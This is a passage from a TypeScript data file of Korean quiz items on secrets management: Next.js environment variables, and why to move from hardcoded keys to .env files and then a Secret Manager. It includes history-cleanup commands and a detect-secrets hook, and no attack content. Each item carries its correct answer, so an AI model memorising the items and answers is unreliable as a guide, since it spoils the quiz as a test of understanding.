      '```typescript\n// ✅ 서버에서만 사용 가능\nconst dbUrl = process.env.DATABASE_URL  // 서버 컴포넌트/API 라우트에서만\nconst jwtSecret = process.env.JWT_SECRET\n\n// ✅ 클라이언트에서 사용 가능 (민감하지 않은 값만)\nconst apiUrl = process.env.NEXT_PUBLIC_API_URL\n\n// ❌ 절대 금지 — 민감 정보에 NEXT_PUBLIC_ 사용\n// NEXT_PUBLIC_JWT_SECRET=xxx  // 브라우저에 노출!\n// NEXT_PUBLIC_DB_PASSWORD=xxx\n\n// 서버 전용 환경변수 강제 검증 (서버 시작 시)\n// lib/env.ts\nimport { z } from "zod"\nconst envSchema = z.object({\n  DATABASE_URL: z.string().url(),\n  JWT_SECRET: z.string().min(32),\n  OPENAI_API_KEY: z.string().startsWith("sk-"),\n})\nexport const env = envSchema.parse(process.env)\n```\n\n.env 파일 관리:\n• `.env.local`: 로컬 개발용, git 제외 (.gitignore)\n• `.env.example`: 변수 이름만 포함한 예시 파일 (git 포함)\n• 운영 환경변수: Vercel/AWS의 환경변수 관리 서비스 사용\n• 절대 `.env` 파일을 git에 커밋하지 말 것',
    relatedProblems: ['auth-q-036'],
  },
  {
    id: 'auth-q-039',
    category: 'auth-security',
    subcategory: 'secrets',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: '시크릿 유출 방지 — config 하드코딩 vs .env vs Secret Manager',
    conceptExplanation:
      '시크릿(비밀 키, API 키, DB 비밀번호 등)을 소스코드에 직접 작성(하드코딩)하면 git 이력에 영구적으로 남아 삭제해도 복구 가능합니다. `.env` 파일은 git에서 제외해 개선되지만, 서버 파일시스템에 평문으로 저장되고 접근 이력 추적이 불가합니다. Secret Manager(AWS Secrets Manager, GCP Secret Manager 등)는 시크릿을 암호화 저장하고 접근 권한 제어와 자동 교체(Rotation)까지 지원합니다.',
    description:
      '소스 코드 config 파일에 API 키·DB 비밀번호를 하드코딩했다가 .env로 옮기고, 최종적으로 Secret Manager(KMS 기반)로 전환해야 하는 이유를 단계별로 올바르게 설명한 것은?',
    options: [
      'config 하드코딩도 충분히 안전하다. git은 비공개 저장소라면 외부에 노출되지 않는다',
      'config 하드코딩 → git 히스토리에 비밀 키 영구 기록(삭제해도 git log에 남음). .env → git 제외로 개선되지만 서버 파일시스템에 평문 존재, 감사 불가. Secret Manager → 암호화 저장·접근 이력 audit·자동 rotation으로 기업 보안 기준 충족',
      '.env와 Secret Manager는 동일하며 이름만 다르다',
      'Secret Manager는 스타트업에는 과도하며 .env로 운영 환경도 충분히 안전하다',
    ],
    correctAnswer: 1,
    explanation:
      '3단계 보안 성숙도입니다. 1단계(config 하드코딩): git push 시 비밀 키가 원격 저장소 히스토리에 영구 기록됩니다. 비공개 저장소도 collaborator·GitHub 직원·토큰 탈취 시 노출됩니다. 2단계(.env 파일): git에서 제외되지만 서버 파일에 평문 저장, 배포 스크립트로 복사되며 누가 언제 봤는지 추적 불가. 3단계(Secret Manager): 암호화 저장, IAM 접근 제어, audit log, 자동 rotation으로 OWASP A02(Cryptographic Failures) 위협 대응. 쿠팡 등 실제 사고 사례에서 config 파일 유출이 대규모 피해로 이어진 선례가 있습니다.',
    hints: ['git 히스토리는 삭제해도 남는다', 'Secret Manager = 암호화 + 감사 + 자동 교체'],
    deepDive:
      '실제 사고 패턴:\n```\n1. 개발자 A: config.ts에 API_KEY="sk-xxx" 하드코딩\n2. git commit & push → GitHub에 영구 기록\n3. 나중에 발견 → git에서 파일 삭제해도 git log에 남음\n4. GitHub secret scanning / 외부 크롤러가 이미 수집\n5. 키 즉시 revoke + 피해 조사 필요\n```\n\ngit 히스토리에서 시크릿 제거 (이미 커밋된 경우):\n```bash\n# BFG Repo-Cleaner 사용 (git filter-branch보다 빠름)\nbfg --replace-text secrets.txt\ngit push --force\n\n# 또는 git filter-repo\ngit filter-repo --path config.ts --invert-paths\n```\n⚠️ 히스토리 재작성 후에도 이미 캐시된 복사본이 있으므로 반드시 키 revoke 필요\n\n보안 성숙도 단계:\n```\n❌ 1단계: config.ts에 하드코딩\n   → git 히스토리에 영구 기록\n   → 코드 리뷰어 모두 노출\n\n⚠️ 2단계: .env 파일 (git 제외)\n   → 서버 파일시스템에 평문\n   → 접근 이력 없음\n   → 개발 환경 OK, 운영은 부족\n\n✅ 3단계: Secret Manager\n   → 암호화 저장 (KMS 키로)\n   → IAM 접근 제어\n   → CloudTrail Audit Log\n   → 자동 Rotation\n   → 운영 환경 필수\n```\n\nGitHub Secret Scanning:\n• GitHub은 공개 repo의 알려진 형식(AWS 키, Stripe 키 등)을 자동 스캔\n• 발견 시 키 발급사에 자동 통보 → 즉시 revoke\n• 비공개 repo도 "Secret scanning alerts" 기능 제공 (GitHub Advanced Security)\n\npre-commit으로 예방:\n```bash\n# .pre-commit-config.yaml\nrepos:\n  - repo: https://github.com/Yelp/detect-secrets\n    hooks:\n      - id: detect-secrets\n        args: [\'--baseline\', \'.secrets.baseline\']\n```',
    relatedProblems: ['auth-q-038', 'infra-q-011', 'infra-q-012'],
  },
]
